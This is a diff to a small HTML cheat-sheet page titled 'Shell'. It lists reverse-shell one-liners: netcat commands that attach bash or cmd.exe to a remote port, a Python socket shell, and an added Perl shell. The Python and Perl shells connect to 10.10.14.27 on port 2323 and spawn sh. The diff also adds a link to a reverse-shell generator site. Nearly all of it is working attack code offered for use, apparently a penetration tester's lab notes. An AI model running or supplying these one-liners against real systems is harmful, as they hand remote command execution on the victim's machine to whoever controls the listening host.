@@ -3,7 +3,9 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Shell</title>
-</head><body><b>netcat</b><br/>
+</head><body><b>https://www.revshells.com/<br/>
+<br/>
+</b><b>netcat</b><br/>
 <br/>
 nc &lt;ip&gt; &lt;port&gt; -e /bin/bash<br/>
 nc &lt;ip&gt; &lt;port&gt; -e cmd.exe<br/>
@@ -16,4 +18,8 @@ pentest monkey<br/>
 <b>python.py</b><br/>
 <br/>
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",2323));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")<br/>
-</body></html>
+<br/>
+<br/>
+<b>perl<br/>
+<br/>
+</b>perl -e 'use Socket;$i="10.10.14.27";$p=2323;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("sh -i");};'</body></html>
